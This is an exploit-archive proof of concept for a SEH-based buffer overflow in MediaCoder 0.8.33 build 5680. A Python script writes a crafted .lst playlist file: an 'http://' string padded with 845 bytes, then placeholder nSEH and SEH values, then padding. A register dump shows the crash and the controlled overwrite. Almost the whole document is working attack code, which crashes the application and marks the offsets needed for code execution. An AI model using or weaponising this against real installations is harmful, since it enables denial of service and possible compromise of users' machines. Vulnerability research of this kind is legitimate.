# Exploit Title: Mediacoder 0.8.33 build 5680 SEH Buffer Overflow Exploit Dos (.lst)
# Date: 11/29/2010
# Author: Hadji Samir s-dz@hotmail.fr
# Software Link: http://dl.mediacoderhq.com/files001/MediaCoder-0.8.33.5680.exe
# Version: 0.8.33 build 5680

   EAX 0012E788
   ECX 43434343
   EDX 00000000
   EBX 43434343
   ESP 0012E724
   EBP 0012E774
   ESI 0012E788
   EDI 00000000

#!/usr/bin/python

buffer = ("http://" + "A" * 845)
nseh = ("B" * 4)
seh  = ("C" * 4)
junk = ("D" * 60)

f= open("exploit.lst",'w')
f.write(buffer + nseh + seh + junk)
f.close()